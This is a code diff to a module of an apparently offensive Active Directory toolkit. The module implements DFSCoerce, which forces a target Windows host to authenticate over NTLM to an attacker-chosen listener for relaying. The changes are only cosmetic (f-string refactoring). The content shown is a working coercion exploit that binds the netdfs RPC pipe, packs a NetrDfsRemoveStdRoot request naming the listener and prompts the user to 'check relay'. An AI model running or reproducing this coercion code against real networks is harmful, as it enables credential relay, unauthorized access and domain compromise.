@@ -1,5 +1,4 @@
 """DFSCoerce — NTLM coercion via MS-DFSNM NetrDfsRemoveStdRoot."""
-from __future__ import annotations
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -23,7 +22,7 @@ def run(args: Any) -> int:
         print("[!] --listener required", file=sys.stderr)
         return 1
 
-    print("[*] DFSCoerce: {} → coerce to {}".format(target, listener))
+    print(f"[*] DFSCoerce: {target} → coerce to {listener}")
 
     try:
         from impacket.dcerpc.v5 import transport
@@ -35,7 +34,7 @@ def run(args: Any) -> int:
     DFSNM_UUID = uuid.uuidtup_to_bin(("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0"))
 
     try:
-        string_binding = "ncacn_np:{}[\\pipe\\netdfs]".format(target)
+        string_binding = f"ncacn_np:{target}[\\pipe\\netdfs]"
         rpc_transport = transport.DCERPCTransportFactory(string_binding)
 
         if cred.username:
@@ -48,7 +47,7 @@ def run(args: Any) -> int:
         dce.bind(DFSNM_UUID)
 
         import struct
-        server_name = "\\\\{}".format(listener)
+        server_name = f"\\\\{listener}"
         request = struct.pack("<I", len(server_name) + 1)
         request += struct.pack("<I", 0)
         request += struct.pack("<I", len(server_name) + 1)
@@ -59,10 +58,10 @@ def run(args: Any) -> int:
         except Exception:
             pass
 
-        print("[+] DFSCoerce triggered — check relay on {}".format(listener))
+        print(f"[+] DFSCoerce triggered — check relay on {listener}")
         dce.disconnect()
         return 0
 
     except Exception as exc:
-        print("[-] DFSCoerce error: {}".format(exc), file=sys.stderr)
+        print(f"[-] DFSCoerce error: {exc}", file=sys.stderr)
         return 1
